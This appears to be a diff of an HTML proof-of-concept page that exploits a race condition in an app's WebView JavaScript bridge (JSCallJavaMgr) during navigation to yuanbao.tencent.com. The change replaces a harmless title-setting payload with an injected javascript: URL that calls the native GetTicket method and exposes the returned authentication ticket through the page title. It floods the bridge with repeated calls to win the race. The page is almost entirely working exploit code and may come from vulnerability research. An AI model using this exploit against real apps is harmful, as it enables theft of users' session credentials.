@@ -1,16 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Race JS Inject v2</title></head>
+<head><meta charset="utf-8"><title>Race GetTicket</title></head>
 <body>
-<h2>Race - LoadUrl javascript: inject v2</h2>
+<h2>Race - GetTicket Steal</h2>
 <pre id="log" style="font-size:10px;"></pre>
 <script>
 var log = document.getElementById('log');
 function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
 
-var js = 'javascript:void(document.title="PWNED_BY_RACE")';
-var c = 0;
+// 注入 payload：注册 callback + 调用 GetTicket + 设置 title
+var js = 'javascript:void('
+    + 'window._s=function(d){document.title=d},'
+    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({'
+    +   'callback:"_s",'
+    +   'module:"CommonPlugin",'
+    +   'method:"GetTicket",'
+    +   'param:{type:"W9"},'
+    +   'callId:"s"'
+    + '}))'
+    + ')';
 
+var c = 0;
 function sendOne() {
     c++;
     var req = JSON.stringify({
@@ -26,16 +36,16 @@ function sendOne() {
 function doRace() {
     if (!window.JSCallJavaMgr) { addLog('ERROR'); return; }
     addLog('URL: ' + location.href);
+    addLog('Payload: ' + js.length + ' chars');
 
-    // 触发 navigate
     location.href = "https://yuanbao.tencent.com/";
 
-    // Phase 1: 同步紧凑循环，最快速度塞满 IPC 队列
+    // Phase 1: 同步循环
     for (var i = 0; i < 500; i++) {
-        try { sendOne(); } catch(e) { addLog('loop break at ' + i); break; }
+        try { sendOne(); } catch(e) { break; }
     }
 
-    // Phase 2: setTimeout 后备，覆盖更晚的竞态窗口
+    // Phase 2: setTimeout 后备
     for (var d = 0; d <= 500; d += 50) {
         (function(delay) {
             setTimeout(function() {
@@ -46,7 +56,7 @@ function doRace() {
         })(d);
     }
 
-    addLog('Phase1: ' + c + ' calls sent');
+    addLog('Phase1: ' + c + ' calls');
 }
 
 setTimeout(function() {
